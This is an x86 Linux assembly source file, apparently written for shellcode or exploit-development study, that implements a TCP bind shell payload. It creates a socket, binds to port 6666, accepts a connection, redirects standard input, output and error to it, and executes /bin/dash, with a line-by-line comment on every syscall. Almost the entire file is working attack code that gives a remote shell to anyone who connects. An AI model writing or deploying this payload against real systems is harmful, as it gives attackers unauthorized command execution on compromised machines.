; Bind Shell TCP Payload
; Website: www.r3oath.com

; Copyright (c) 2013 Tristan Strathearn

; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:

; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.

; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.

; Binds /bin/dash to the local address on port 6666

global _start

section .text
_start:

	; Preparation
	xor ebx, ebx
	mov ecx, ebx
	mul ecx

	; Socket
	; int socket(int domain, int type, int protocol);
	; Called through int socketcall(int call, unsigned long *args);

	push eax 		; Push 0x00000000 (int protocol):socket
	inc ebx 		; Load 0x00000001 (int call):socketcall
	push ebx 		; Push 0x00000001 (int type):socket
	push 0x2 		; Push 0x00000002 (int domain):socket
	mov ecx, esp 	; Pointer to above arguments
	mov al, 0x66
	int 0x80

	; Save the return value (our FD)
	mov edx, eax

	; Bind
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; Called through int socketcall(int call, unsigned long *args);

	xor eax, eax
	push eax 			; Push 0x00000000, part of const struct sockaddr *addr
	push WORD 0x0a1a 	; BIND PORT 6666, part of const struct sockaddr *addr
	push WORD 2 		; Push 0x0002, part of const struct sockaddr *addr
	mov ecx, esp 		; Save our struct pointer in ECX

	push 0x10	; Push 0x00000010/dec-16 (socklen_t addrlen):bind
	push ecx	; Push ECX pointer (const struct sockaddr *addr):bind
	push edx 	; Push our FD (int sockfd):bind

	mov ecx, esp 	; Pointer to above arguments
	inc ebx			; Socketcall type 2 (previous value was 0x00000001)
	mov al, 0x66
	int 0x80

	; Listen
	; int listen(int sockfd, int backlog);
	; Called through int socketcall(int call, unsigned long *args);

	xor eax, eax
	push eax 		; Push 0x00000000 (int backlog):listen
	push edx		; Push our FD (int sockfd):listen
	
	mov ecx, esp	; Pointer to above arguments
	add ebx, 0x2 	; Socketcall type 4 (previous value was 0x00000002)
	mov al, 0x66
	int 0x80		

	; Accept
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; Called through int socketcall(int call, unsigned long *args);

	xor eax, eax	
	push eax 		; Push 0x00000000 (socklen_t *addrlen):accept
	push eax		; Push 0x00000000 (struct sockaddr *addr):accept
	push edx		; Push our FD (int sockfd):accept

	mov ecx, esp
	inc ebx 		; Socketcall type 5 (previous value was 0x00000004)
	mov al, 0x66
	int 0x80	

	; Duplicate FDs
	; int dup2(int oldfd, int newfd);
	
	mov ebx, eax	; Load in out "old" FD (returned by accept)
	xor eax, eax

	mov ecx, eax	; Load our new FD (stdin)
	mov al, 0x3f
	int 0x80

	inc ecx			; Load our new FD (stdout)
	mov al, 0x3f
	int 0x80

	inc ecx			; Load our new FD (stderr)
	mov al, 0x3f
	int 0x80

	; Spawn Shell
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	
	xor eax, eax

	; Prepare argument string
	push eax 	; Push 0x00000000 (null terminating byte)

	; Push "/bin////dash" in reverse byte order
	push 0x68736164	; Push "hsad"
	push 0x2f2f2f2f ; Push "////"
	push 0x6e69622f ; Push "nib/"

	mov edx, eax	; Load 0x00000000 (char *const envp[]):execve
	mov ecx, eax	; Load 0x00000000 (char *const argv[]):execve
	mov ebx, esp	; Load pointer to "/bin////dash" string above (const char *filename):execve

	mov al, 0xb
	int 0x80